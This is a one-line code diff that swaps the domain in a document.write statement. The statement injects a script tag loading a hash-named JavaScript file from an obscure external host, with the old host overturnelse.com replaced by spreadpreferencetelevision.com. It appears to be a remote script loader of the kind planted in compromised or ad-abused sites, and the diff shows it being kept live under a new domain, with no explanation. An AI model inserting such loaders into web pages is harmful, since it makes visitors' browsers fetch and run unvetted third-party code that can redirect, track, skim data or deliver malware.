@@ -1,1 +1,1 @@
-document.write("<script src='//overturnelse.com/04/32/b3/0432b39f07b824e25daa06eba65aa973.js' type='text/javascript'><\/script>");
+document.write("<script src='//spreadpreferencetelevision.com/04/32/b3/0432b39f07b824e25daa06eba65aa973.js' type='text/javascript'><\/script>");
